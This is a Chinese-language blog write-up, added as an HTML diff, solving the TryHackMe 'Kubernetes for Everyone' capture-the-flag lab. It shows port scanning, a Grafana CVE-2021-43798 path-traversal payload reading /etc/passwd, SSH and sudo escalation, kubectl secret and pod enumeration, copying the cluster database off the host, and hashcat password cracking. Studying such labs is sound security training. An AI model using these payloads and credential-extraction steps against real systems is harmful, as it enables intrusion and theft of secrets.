@@ -1,0 +1,785 @@
+<!DOCTYPE html>
+<html lang="zh-CN" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="author" content="s3ven" />
+  <!-- Open Graph Description 简短摘要-->
+  
+  <meta property="og:site_name" content="s3ven&#39;s blog">
+  
+  
+  <!-- 用于搜索引擎的文章摘要 -->
+  
+  
+  
+  <title>云原生安全 Kubernetes for Everyone WriteUp | s3ven&#39;s blog</title>
+
+  
+    <link rel="apple-touch-icon" href="/images/favicon.png">
+    <link rel="icon" href="/images/favicon.png">
+  
+
+  <!-- Font -->
+  <link href="https://npm.elemecdn.com/lxgw-wenkai-webfont/style.css" rel="stylesheet" >
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  <link rel="stylesheet" href="/css/main.css" />
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
+  <!-- 代码块风格 -->
+  
+
+  <!-- jquery3.3.1 -->
+  
+    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
+  
+
+  <!-- fancybox -->
+  
+    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
+    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
+  
+  
+<script src="../../js/fancybox.js"></script>
+
+
+  
+
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/images/avatar.png" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">s3ven's blog</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">Home</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">Archives</a>
+        </li>
+      
+        <li class="nav-item" data-path="/categories/">
+          <a href="/categories/">Categories</a>
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          <a href="/tags/">Tags</a>
+        </li>
+      
+        <li class="nav-item" data-path="/links/">
+          <a href="/links/">Links</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">About</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="../../js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
+  
+  
+<script src="../../js/codeCopy.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  <div class="container-wider post-details" id="post-details">
+    <div class="zoom-wrap">
+      <div class="post-content">
+        <div class="post-title">云原生安全 Kubernetes for Everyone WriteUp</div>
+        <div class="post-attach">
+          <span class="post-pubtime">
+            <i class="iconfont icon-updatetime mr-10" title="创建时间"></i>
+            2024-02-01
+          </span>
+          
+                <span class="post-categories">
+                  <i class="iconfont icon-bookmark mr-10" title="分类"></i>
+                  
+                  <span class="span--category">
+                    <a href="../../categories/write-up/" title="Write Up">
+                      Write Up
+                    </a>
+                  </span>
+                  
+                </span>
+            
+                <span class="post-tags">
+                  <i class="iconfont icon-tags mr-10" title="标签"></i>
+                  
+                  <span class="span--tag mr-8">
+                    <a href="../../tags/kubernetes/" title="Kubernetes">
+                      #Kubernetes
+                    </a>
+                  </span>
+                  
+                </span>
+            
+        </div>
+        <div class="markdown-body">
+          
+<style id="hexo-wm">
+.hexo-wm {
+  color: transparent !important;
+  opacity: 0 !important;
+  font-size: 0 !important;
+  line-height: 0 !important;
+  pointer-events: none !important;
+  user-select: text !important;
+  -webkit-user-select: text !important;
+  speak: none !important;
+  vertical-align: baseline !important;
+  display: inline !important;
+}
+
+.hexo-wm * { color: transparent !important; opacity: 0 !important; }
+</style>
+<html><head></head><body><h2 id="1-端口扫描"><a href="#1-端口扫描" class="headerlink" title="1. 端口扫描"></a>1. 端口扫描</h2><p>使用 <code>nmap</code> 进行全端口扫描：</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-F</span> <span class="token operator">&lt;</span>server_ip<span class="token operator">&gt;</span></code></pre>
+<pre class="language-none"><code class="language-none">PORT     STATE SERVICE
+22/tcp   open  ssh
+111/tcp  open  rpcbind
+3000/tcp open  ppp
+5000/tcp open  upnp</code></pre>
+
+<h2 id="2-Grafana任意文件读取"><a href="#2-Grafana任意文件读取" class="headerlink" title="2. Grafana任意文件读取"></a>2. Grafana任意文件读取</h2><p>3000 端口处存在一个 版本号为 <code>v8.3.0</code> 的 <code>Grafana</code>：</p>
+<p><img src="image-1.png" alt="image-1.png"><br>在 <code>exploit-db</code> 中搜索该版本 <code>Grafana</code> 漏洞：</p>
+<pre class="language-none"><code class="language-none">CVE-2021-43798：Grafana任意文件读取漏洞
+https://www.exploit-db.com/exploits/50581</code></pre>
+<p>使用 payl<span class="hexo-wm">𝘀﻿﻿³𝐯𝐞𝘯.‍ꜱi​tｅ﻿‍</span>oad 阅读 <code>/etc/passwd</code>：</p>
+<pre class="language-none"><code class="language-none">/public/plugins/gettingstarted/../../../../../../../../../../../../../../../etc/passwd</code></pre>
+<p>/etc/passwd</p>
+<pre class="language-none"><code class="language-none">root:x:0:0:root:/root:/bin/ash
+bin:x:1:1:bin:/bin:/sbin/nologin
+daemon:x:2:2:daemon:/sbin:/sbin/nologin
+adm:x:3:4:adm:/var/adm:/sbin/nologin
+lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
+sync:x:5:0:sync:/sbin:/bin/sync
+shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
+halt:x:7:0:halt:/sbin:/sbin/halt
+mail:x:8:12:mail:/var/mail:/sbin/nologin
+news:x:9:13:news:/usr/lib/news:/sbin/nologin
+uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
+operator:x:11:0:operator:/root:/sbin/nologin
+man:x:13:15:man:/usr/man:/sbin/nologin
+postmaster:x:14:12:postmaster:/var/mail:/sbin/nologin
+cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
+ftp:x:21:21::/var/lib/ftp:/sbin/nologin
+sshd:x:22:22:sshd:/dev/null:/sbin/nologin
+at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
+squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
+xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
+games:x:35:35:games:/usr/games:/sbin/nologin
+cyrus:x:85:12::/usr/cyrus:/sbin/nologin
+vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
+ntp:x:123:123:NTP:/var/empty:/sbin/nologin
+smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
+guest:x:405:100:guest:/dev/null:/sbin/nologin
+nobody:x:65534:65534:nobody:/:/sbin/nologin
+grafana:x:472:0:hereiamatctf907:/home/grafana:/sbin/nologin</code></pre>
+<p>在其中获得 s<span class="hexo-wm">𝘴‍𝟯vｅ𝐧•​‍𝘴ｉ‌𝐭𝘦﻿</span>sh 密码 <code>hereiamatctf907</code> （好奇怪的出现位置）</p>
+<h2 id="3-静态文件信息泄露"><a href="#3-静态文件信息泄露" class="headerlink" title="3. 静态文件信息泄露"></a>3. 静态文件信息泄露</h2><p>5000 端口处存<span class="hexo-wm">𝒔‌𝟯ⅴ𝘦𝒏•﻿‍s𝐢‌t℮‌</span>在一个静态小游戏：</p>
+<p><img src="image-2.png" alt="image-2.png"><br>其中 main.css 中存在一段被注释的 @import 导入样式表比较可疑：<br>/static/css<span class="hexo-wm">𝐬﻿﻿𝟯ⅴ𝐞ｎ∙‍𝐬𝐢​‍ｔe‌</span>/main.css</p>
+<pre class="language-none"><code class="language-none">/* @import url("https://pastebin.com/cPs69B0y"); */</code></pre>
+<p>打开后发现一段编<span class="hexo-wm">𝒔‍‌3𝒗ｅ𝘯．​ѕ𝘪﻿​te​‍</span>码后的字符串：</p>
+<pre class="language-none"><code class="language-none">OZQWO4TBNZ2A====</code></pre>
+<p>使用 ciphey 解密，<span class="hexo-wm">𝐬﻿𝟯𝘷eｎ․​‍𝘀ⅈ‍﻿𝘵𝘦‌﻿</span>获得 ssh 账号和密码：<code>vagrant:hereiamatctf907</code></p>
+<h2 id="4-Kubernetes信息收集"><a href="#4-Kubernetes信息收集" class="headerlink" title="4. Kubernetes信息收集"></a>4. Kubernetes信息收集</h2><p>使用 ssh 连接靶机：</p>
+<pre class="language-none"><code class="language-none">ssh vagrant@&lt;server_ip&gt;</code></pre>
+<p>由于 sudo 命令无需密码校验，使用 <code>sudo su</code> 进行权限提升<br>后续由于靶机环境无法正常使用 kubectl，<span class="hexo-wm">𝐬​‍³𝐯ｅn∙‌𝒔𝘪‍‍𝒕e‍</span>因此在此处记录理论方法和实际方法两种</p>
+<h3 id="4-1-理论方法"><a href="#4-1-理论方法" class="headerlink" title="4.1 理论方法"></a>4.1 理论方法</h3><p>通过 <code>ps aux</code> 查找关键进程：</p>
+<pre class="language-none"><code class="language-none">USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
+root      1407  5.7  5.6 787492 27636 ?        Ssl  12:40   0:38 /usr/local/bin/k0s controller --single=true</code></pre>
+<p>发现靶机运行的是 <span class="hexo-wm">ѕ﻿⑶𝒗𝘦n•‍s𝘪‍𝐭𝘦​﻿</span>k0s（轻量版k8s）</p>
+<h4 id="4-1-1-secret信息收集"><a href="#4-1-1-secret信息收集" class="headerlink" title="4.1.1 secret信息收集"></a>4.1.1 secret信息收集</h4><p>使用 kubectl 获取 <span class="hexo-wm">s‌3𝐯e𝐧•‌𝒔ⅈ﻿‌t℮​</span>secret 列表：</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">k0s kubectl get secret</code></pre>
+<pre class="language-none"><code class="language-none">NAME                  TYPE                                  DATA   AGE
+default-token-nhwb5   kubernetes.io/service-account-token   3      2d8h
+k8s.authentication    Opaque     </code></pre>
+<p>深入 <code>k8s.authentication</code> 获取信息</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">k0s kubectl get secret k8s.authentication <span class="token parameter variable">-o</span> json</code></pre>
+<pre class="language-none"><code class="language-none">{
+    "apiVersion": "v1",
+    "data": {
+        "id": "VEhNe3llc190aGVyZV8kc19ub18kZWNyZXR9"
+    },
+    "kind": "Secret",
+    "metadata": {
+        "creationTimestamp": "2022-02-10T18:58:02Z",
+        "name": "k8s.authentication",
+        "namespace": "default",
+        "resourceVersion": "515",
+        "uid": "416e4783-03a8-4f92-8e91-8cbc491bf727"
+    },
+    "type": "Opaque"
+}</code></pre>
+<p>在 value 处获取到编码过后的 flag</p>
+<pre class="language-none"><code class="language-none">VEhNe3llc190aGVyZV8kc19ub18kZWNyZXR9</code></pre>
+<p>使用 ciph<span class="hexo-wm">𝒔﻿​⑶𝒗℮𝒏．​‍𝒔𝐢‌﻿t℮﻿​</span>ey 解密：</p>
+<p><img src="image-3.png" alt="image-3.png"><br>获得 flag：</p>
+<pre class="language-none"><code class="language-none">THM{yes_there_$s_no_$ecret}</code></pre>
+<h4 id="4-1-2-pod信息收集"><a href="#4-1-2-pod信息收集" class="headerlink" title="4.1.2 pod信息收集"></a>4.1.2 pod信息收集</h4><p>使用 kubectl <span class="hexo-wm">𝘴‍​³𝘷𝐞𝘯．​𝒔ｉ‍𝘵e﻿​</span>获取所有 pod：</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">k0s kubectl get pod <span class="token parameter variable">-A</span></code></pre>
+<pre class="language-none"><code class="language-none">NAMESPACE     NAME                              READY   STATUS      RESTARTS       AGE
+internship    internship-job-5drbm              0/1     Completed   0              2d8h
+kube-system   kube-proxy-jws4q                  1/1     Running     1 (102s ago)   2d8h
+kube-system   kube-router-vsq85                 1/1     Running     1 (102s ago)   2d8h
+kube-system   kube-api                          1/1     Running     1 (102s ago)   2d8h
+kube-system   coredns-6d9f49dcbb-9vbff          1/1     Running     1 (102s ago)   2d8h
+kube-system   metrics-server-74c967d8d4-pvv8l   1/1     Running     1 (102s ago)   2d8h</code></pre>
+<p>一般在 kube-system 里面的 pod 都是 k8s 自己的服务,<span class="hexo-wm">ꜱ‍​⑶𝒗en.﻿‍si﻿𝒕𝘦‌</span> 并且会有一段随机后缀, 但是这里的 kube-api 并没有随机后缀, 比较可疑</p>
+<p>深入 <code>kube-api</code> 获取信息：</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">k0s kubectl <span class="token builtin class-name">exec</span> <span class="token parameter variable">-it</span> kube-api <span class="token parameter variable">-n</span> kube-system -- /bin/bash</code></pre>
+<pre class="language-none"><code class="language-none">cd jokes
+ls -la</code></pre>
+
+<p>其中 .git<span class="hexo-wm">ѕ‍𝟯ⅴｅn．​𝘀i‌𝒕ｅ‍‌</span> 仓库比较可疑<br>查看分支和 commit 记录：</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> reflog
+<span class="token function">git</span> log</code></pre>
+
+<p><img src="image-4.png" alt="image-4.png"></p>
+<p>挨个 <code>git show</code>，获得 flag：</p>
+<pre class="language-none"><code class="language-none">THM{this_joke_is_cold_joke}</code></pre>
+<h4 id="4-1-3-job信息收集"><a href="#4-1-3-job信息收集" class="headerlink" title="4.1.3 job信息收集"></a>4.1.3 job信息收集</h4><p>由题目提示 <code>What's the secret to the FANG interview?</code><br>使用 kubectl <span class="hexo-wm">𝒔‌3𝐯𝘦𝒏.‍﻿s𝐢​​t℮​</span>获取 internship job 信息：</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">k0s kubectl get job <span class="token parameter variable">-n</span> internship</code></pre>
+<pre class="language-none"><code class="language-none">NAME             COMPLETIONS   DURATION   AGE
+internship-job   1/1           3m10s      2d8h</code></pre>
+<p>查看 <code>internship</code> job 的 yaml 配置文件：</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">k0s kubectl get job <span class="token parameter variable">-n</span> internship <span class="token parameter variable">-o</span> yaml</code></pre>
+<pre class="language-yaml" data-language="yaml"><code class="language-yaml"><span class="token key atrule">apiVersion</span><span class="token punctuation">:</span> v1
+<span class="token key atrule">items</span><span class="token punctuation">:</span>
+<span class="token punctuation">-</span> <span class="token key atrule">apiVersion</span><span class="token punctuation">:</span> batch/v1
+  <span class="token key atrule">kind</span><span class="token punctuation">:</span> Job
+  <span class="token key atrule">metadata</span><span class="token punctuation">:</span>
+    <span class="token key atrule">annotations</span><span class="token punctuation">:</span>
+      <span class="token key atrule">batch.kubernetes.io/job-tracking</span><span class="token punctuation">:</span> <span class="token string">""</span>
+    <span class="token key atrule">creationTimestamp</span><span class="token punctuation">:</span> <span class="token string">"2022-02-10T18:55:33Z"</span>
+    <span class="token key atrule">generation</span><span class="token punctuation">:</span> <span class="token number">1</span>
+    <span class="token key atrule">labels</span><span class="token punctuation">:</span>
+      <span class="token key atrule">controller-uid</span><span class="token punctuation">:</span> 11cf55dc<span class="token punctuation">-</span>7903<span class="token punctuation">-</span>4b78<span class="token punctuation">-</span>b9d3<span class="token punctuation">-</span>62cf241ad26d
+      <span class="token key atrule">job-name</span><span class="token punctuation">:</span> internship<span class="token punctuation">-</span>job
+    <span class="token key atrule">name</span><span class="token punctuation">:</span> internship<span class="token punctuation">-</span>job
+    <span class="token key atrule">namespace</span><span class="token punctuation">:</span> internship
+    <span class="token key atrule">resourceVersion</span><span class="token punctuation">:</span> <span class="token string">"579"</span>
+    <span class="token key atrule">uid</span><span class="token punctuation">:</span> 11cf55dc<span class="token punctuation">-</span>7903<span class="token punctuation">-</span>4b78<span class="token punctuation">-</span>b9d3<span class="token punctuation">-</span>62cf241ad26d
+  <span class="token key atrule">spec</span><span class="token punctuation">:</span>
+    <span class="token key atrule">backoffLimit</span><span class="token punctuation">:</span> <span class="token number">6</span>
+    <span class="token key atrule">completionMode</span><span class="token punctuation">:</span> NonIndexed
+    <span class="token key atrule">completions</span><span class="token punctuation">:</span> <span class="token number">1</span>
+    <span class="token key atrule">parallelism</span><span class="token punctuation">:</span> <span class="token number">1</span>
+    <span class="token key atrule">selector</span><span class="token punctuation">:</span>
+      <span class="token key atrule">matchLabels</span><span class="token punctuation">:</span>
+        <span class="token key atrule">controller-uid</span><span class="token punctuation">:</span> 11cf55dc<span class="token punctuation">-</span>7903<span class="token punctuation">-</span>4b78<span class="token punctuation">-</span>b9d3<span class="token punctuation">-</span>62cf241ad26d
+    <span class="token key atrule">suspend</span><span class="token punctuation">:</span> <span class="token boolean important">false</span>
+    <span class="token key atrule">template</span><span class="token punctuation">:</span>
+      <span class="token key atrule">metadata</span><span class="token punctuation">:</span>
+        <span class="token key atrule">creationTimestamp</span><span class="token punctuation">:</span> <span class="token null important">null</span>
+        <span class="token key atrule">labels</span><span class="token punctuation">:</span>
+          <span class="token key atrule">controller-uid</span><span class="token punctuation">:</span> 11cf55dc<span class="token punctuation">-</span>7903<span class="token punctuation">-</span>4b78<span class="token punctuation">-</span>b9d3<span class="token punctuation">-</span>62cf241ad26d
+          <span class="token key atrule">job-name</span><span class="token punctuation">:</span> internship<span class="token punctuation">-</span>job
+      <span class="token key atrule">spec</span><span class="token punctuation">:</span>
+        <span class="token key atrule">containers</span><span class="token punctuation">:</span>
+        <span class="token punctuation">-</span> <span class="token key atrule">command</span><span class="token punctuation">:</span>
+          <span class="token punctuation">-</span> echo
+          <span class="token punctuation">-</span> 26c3d1c068e7e01599c3612447410b5e56c779f1
+          <span class="token key atrule">image</span><span class="token punctuation">:</span> busybox
+          <span class="token key atrule">imagePullPolicy</span><span class="token punctuation">:</span> Always
+          <span class="token key atrule">name</span><span class="token punctuation">:</span> internship<span class="token punctuation">-</span>job
+          <span class="token key atrule">resources</span><span class="token punctuation">:</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
+          <span class="token key atrule">terminationMessagePath</span><span class="token punctuation">:</span> /dev/termination<span class="token punctuation">-</span>log
+          <span class="token key atrule">terminationMessagePolicy</span><span class="token punctuation">:</span> File
+        <span class="token key atrule">dnsPolicy</span><span class="token punctuation">:</span> ClusterFirst
+        <span class="token key atrule">restartPolicy</span><span class="token punctuation">:</span> Never
+        <span class="token key atrule">schedulerName</span><span class="token punctuation">:</span> default<span class="token punctuation">-</span>scheduler
+        <span class="token key atrule">securityContext</span><span class="token punctuation">:</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
+        <span class="token key atrule">terminationGracePeriodSeconds</span><span class="token punctuation">:</span> <span class="token number">30</span>
+  <span class="token key atrule">status</span><span class="token punctuation">:</span>
+    <span class="token key atrule">completionTime</span><span class="token punctuation">:</span> <span class="token string">"2022-02-10T18:59:26Z"</span>
+    <span class="token key atrule">conditions</span><span class="token punctuation">:</span>
+    <span class="token punctuation">-</span> <span class="token key atrule">lastProbeTime</span><span class="token punctuation">:</span> <span class="token string">"2022-02-10T18:59:26Z"</span>
+      <span class="token key atrule">lastTransitionTime</span><span class="token punctuation">:</span> <span class="token string">"2022-02-10T18:59:26Z"</span>
+      <span class="token key atrule">status</span><span class="token punctuation">:</span> <span class="token string">"True"</span>
+      <span class="token key atrule">type</span><span class="token punctuation">:</span> Complete
+    <span class="token key atrule">startTime</span><span class="token punctuation">:</span> <span class="token string">"2022-02-10T18:56:16Z"</span>
+    <span class="token key atrule">succeeded</span><span class="token punctuation">:</span> <span class="token number">1</span>
+    <span class="token key atrule">uncountedTerminatedPods</span><span class="token punctuation">:</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
+<span class="token key atrule">kind</span><span class="token punctuation">:</span> List
+<span class="token key atrule">metadata</span><span class="token punctuation">:</span>
+  <span class="token key atrule">resourceVersion</span><span class="token punctuation">:</span> <span class="token string">""</span></code></pre>
+<p>在 command <span class="hexo-wm">𝘀​‌𝟯𝘷𝘦𝒏•‌𝐬ⅈ‌‍𝐭𝘦‌​</span>中获得加密后的 flag</p>
+<pre class="language-yaml" data-language="yaml"><code class="language-yaml"><span class="token punctuation">-</span> <span class="token key atrule">command</span><span class="token punctuation">:</span>
+  <span class="token punctuation">-</span> echo
+  <span class="token punctuation">-</span> 26c3d1c068e7e01599c3612447410b5e56c779f1</code></pre>
+<p>hashcat <span class="hexo-wm">ѕ‍⑶𝘷𝘦ｎ·‍𝘀𝐢​𝘵℮﻿﻿</span>跑 rockyou.txt：</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">gzip</span> <span class="token parameter variable">-d</span> /usr/share/wordlists/rockyou.txt.gz
+<span class="token function">chmod</span> <span class="token number">777</span> /usr/share/wordlists/rockyou.txt
+hashcat <span class="token parameter variable">-m</span> <span class="token number">100</span> <span class="token parameter variable">-a</span> <span class="token number">0</span> 26c3d1c068e7e01599c3612447410b5e56c779f1 /usr/share/wordlists/rockyou.txt</code></pre>
+<p>获得 flag</p>
+<pre class="language-none"><code class="language-none">26c3d1c068e7e01599c3612447410b5e56c779f1:chidori</code></pre>
+<h3 id="4-2-实际方法"><a href="#4-2-实际方法" class="headerlink" title="4.2 实际方法"></a>4.2 实际方法</h3><h4 id="4-2-1-secret信息收集"><a href="#4-2-1-secret信息收集" class="headerlink" title="4.2.1 secret信息收集"></a>4.2.1 secret信息收集</h4><p><code>ps aux</code>：</p>
+<pre class="language-none"><code class="language-none">USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
+kube-ap+  1717  2.4  6.3 728184 31344 ?        Sl   07:54   1:01 /var/lib/k0s/bin/kine --endpoint=sqlite:///var/lib/k0s/db/state.db?more=rwc&amp;_journal=WAL&amp;cache=shared --listen-address=unix:///run/k0s/kine/kine.sock:2379</code></pre>
+<p>由于 kubectl 无法正常使用，我们通过下载并分析 <span class="hexo-wm">s‌⑶𝐯𝘦𝒏.‍s𝐢‍𝐭𝐞​</span>kine（etcd数据库）来获取数据</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">cp</span> /var/lib/k0s/db/state.db ./state.db
+<span class="token function">chmod</span> <span class="token number">777</span> ./state.db
+<span class="token function">scp</span> vagrant@<span class="token operator">&lt;</span>server_ip<span class="token operator">&gt;</span>:~/state.db <span class="token builtin class-name">.</span></code></pre>
+<p>使用 vscode-sqlite <span class="hexo-wm">𝘀​‌3𝘷𝘦𝒏․​​𝘀𝘪﻿ｔe​‌</span>插件打开 state.db</p>
+<pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> name<span class="token punctuation">,</span>hex<span class="token punctuation">(</span><span class="token keyword">value</span><span class="token punctuation">)</span> <span class="token keyword">from</span> kine <span class="token keyword">where</span> name <span class="token operator">like</span> <span class="token string">'%/registry/secrets/default/%'</span><span class="token punctuation">;</span></code></pre>
+<pre class="language-none"><code class="language-none">/registry/secrets/default/default-token-nhwb5	...
+/registry/secrets/default/k8s.authentication	...</code></pre>
+<p>使用字符编码解码 k8s.authentication ，获得 flag</p>
+<pre class="language-none"><code class="language-none">THM{yes_there_$s_no_$ecret}</code></pre>
+<h4 id="4-2-2-pod-数据收集"><a href="#4-2-2-pod-数据收集" class="headerlink" title="4.2.2 pod 数据收集"></a>4.2.2 pod 数据收集</h4><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> name<span class="token punctuation">,</span>hex<span class="token punctuation">(</span><span class="token keyword">value</span><span class="token punctuation">)</span> <span class="token keyword">from</span> kine <span class="token keyword">where</span> name <span class="token operator">like</span> <span class="token string">'%/registry/pods/%'</span><span class="token punctuation">;</span></code></pre>
+
+<p><img src="image-5.png" alt="image-5.png"></p>
+<p>一般在 kube-system 里面的 pod 都是 k8s 自己的服务, 并且会有一段随机后缀, 但是这里的 <span class="hexo-wm">𝘴​3𝐯eｎ·‍​𝐬ⅈ​𝘵𝘦﻿​</span>kube-api 并没有随机后缀, 比较可疑</p>
+<p>深入 <code>kube-api</code> pod：</p>
+<pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> name<span class="token punctuation">,</span>hex<span class="token punctuation">(</span><span class="token keyword">value</span><span class="token punctuation">)</span> <span class="token keyword">from</span> kine <span class="token keyword">where</span> name <span class="token operator">like</span> <span class="token string">'%/registry/pods/kube-system/kube-api%'</span><span class="token punctuation">;</span></code></pre>
+<p>发现该 pod 的 dockerhub 仓库镜像地址<br><img src="image-6.png" alt="image-6.png"><br>把该 docker <span class="hexo-wm">ѕ​⑶𝒗𝐞𝘯．‍𝐬i‌‍ｔ𝐞​​</span>image pull 到本地<br>发现 /home/ubuntu/jokes 内存在用户文件</p>
+<p><img src="image-7.png" alt="image-7.png"></p>
+<p>其中 .git 仓库比较可疑<br>查看分支和 commit 记录：</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> reflog
+<span class="token function">git</span> log</code></pre>
+<p><img src="image-8.png" alt="image-8.png"><br>挨个 <code>git show</code>，获得 flag：</p>
+<pre class="language-none"><code class="language-none">THM{this_joke_is_cold_joke}</code></pre>
+
+<h4 id="4-2-3-job信息收集"><a href="#4-2-3-job信息收集" class="headerlink" title="4.2.3 job信息收集"></a>4.2.3 job信息收集</h4><p>由题目提示 <code>What's the secret to the FANG interview?</code><br>我们深入 <code>internship-job-5drbm</code> pod：</p>
+<pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> name<span class="token punctuation">,</span>hex<span class="token punctuation">(</span><span class="token keyword">value</span><span class="token punctuation">)</span> <span class="token keyword">from</span> kine <span class="token keyword">where</span> name <span class="token operator">like</span> <span class="token string">'%/registry/pods/internship/internship-job-5drbm%'</span><span class="token punctuation">;</span></code></pre>
+
+<p><img src="image-9.png" alt="image-9.png"><br>发现该 pod 使用了 <span class="hexo-wm">𝘀‌⑶ⅴℯｎ.​‌𝒔i​​𝐭ｅ‍﻿</span>busybox 镜像，并在启动时执行了 echo 命令放置 flag<br>hashcat 跑 rockyou.txt：</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">gzip</span> <span class="token parameter variable">-d</span> /usr/share/wordlists/rockyou.txt.gz
+<span class="token function">chmod</span> <span class="token number">777</span> /usr/share/wordlists/rockyou.txt
+hashcat <span class="token parameter variable">-m</span> <span class="token number">100</span> <span class="token parameter variable">-a</span> <span class="token number">0</span> 26c3d1c068e7e01599c3612447410b5e56c779f1 /usr/share/wordlists/rockyou.txt</code></pre>
+<p>获得 flag</p>
+<pre class="language-none"><code class="language-none">26c3d1c068e7e01599c3612447410b5e56c779f1:chidori</code></pre>
+</body></html>
+        </div>
+        
+          <div class="prev-or-next">
+            <div class="post-foot-next">
+              
+                <a href="../2024-%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91-qual-writeup/" target="_self">
+                  <i class="iconfont icon-chevronleft"></i>
+                  <span>上一页</span>
+                </a>
+              
+            </div>
+            <div class="post-foot-prev">
+              
+                <a href="../2024-n1ctf-junior-writeup/" target="_self">
+                  <span>下一页</span>
+                  <i class="iconfont icon-chevronright"></i>
+                </a>
+              
+            </div>
+          </div>
+        
+      </div>
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="catalog-zoom">
+      <div class="title">目录</div>
+      <div class="catalog-content">
+        
+          <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-text">1. 端口扫描</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-Grafana%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="toc-text">2. Grafana任意文件读取</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E9%9D%99%E6%80%81%E6%96%87%E4%BB%B6%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2"><span class="toc-text">3. 静态文件信息泄露</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-Kubernetes%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text">4. Kubernetes信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#4-1-%E7%90%86%E8%AE%BA%E6%96%B9%E6%B3%95"><span class="toc-text">4.1 理论方法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#4-1-1-secret%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text">4.1.1 secret信息收集</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-1-2-pod%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text">4.1.2 pod信息收集</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-1-3-job%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text">4.1.3 job信息收集</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-2-%E5%AE%9E%E9%99%85%E6%96%B9%E6%B3%95"><span class="toc-text">4.2 实际方法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#4-2-1-secret%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text">4.2.1 